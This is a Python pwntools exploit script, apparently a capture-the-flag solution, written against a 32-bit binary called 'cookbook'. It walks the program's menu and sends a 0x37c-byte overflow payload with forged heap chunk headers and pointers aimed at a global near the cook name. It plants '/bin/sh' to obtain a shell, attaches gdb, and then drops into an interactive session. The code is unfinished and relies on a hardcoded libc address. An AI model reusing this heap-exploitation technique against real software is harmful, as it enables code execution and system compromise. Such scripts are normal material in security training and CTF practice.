# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
r = process('./cookbook')

libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
binn = ELF("./cookbook")


print(str(r.proc.pid))

r.recv(timeout=0.1)


r.sendline('/bin/sh\0'.ljust(8,'\x00')) # name
# while 1:
#     pass    
res = r.recv(timeout=0.1)
# print('[*] got res: ', res)
# r.sendline('g') #cookbook name
# r.recvuntil('chef and a hacker!) :')
# r.sendline('10')
# r.sendline('B'*15)
# # pause()

# r.recvuntil('uit\n')

r.sendline('c')
r.sendline('n')
r.sendline('q')

r.recvuntil('uit\n')
r.sendline('g')
r.sendline('60')
r.sendline('AAA')

r.recvuntil('uit\n') # useless!
r.sendline('a')
r.sendline('n')
r.sendline('q')


r.recvuntil('uit\n') 
r.sendline('R')


# r.recvuntil('uit\n')
# r.sendline('g')
# r.sendline('50')
# r.sendline('')


r.recvuntil('uit\n') # rename recipe instruction
r.sendline('c')
r.sendline('g')
# # r.send('\x41'*0x37c + p32(0x37c) + p32(0x68))

# r.sendline('\x41'*0x37c + '\x42'*7)
# # r.send('\n\n')


cook_name = 0x0804D0AC
# r.send(p32(0x0)*4+p32(0x371)+'\x40'*(0x37c-4*5) + p32(0x370) + p32(0x68))
payload = ''
# payload += 
payload = payload.ljust(int(0x37c-0x10), '\x41')
payload += p32(0x0) + p32(0x11) + p32(0x42) + p32(0x42)
payload += p32(0x10) + p32(0x69) + p32(0xf7fc67b0) + p32(cook_name-8)
r.sendline(payload)
r.sendline('q')


r.recvuntil('uit\n') 
r.sendline('g')
r.sendline('60')
r.sendline('A')


gdb.attach(r, """
heapinfo
x/10wx 0x804f6b8-0x10
x/10wx 0x804f2b0
x/20wx  0x804f6b8-0x37c

""");

print(str(r.proc.pid))

r.interactive()

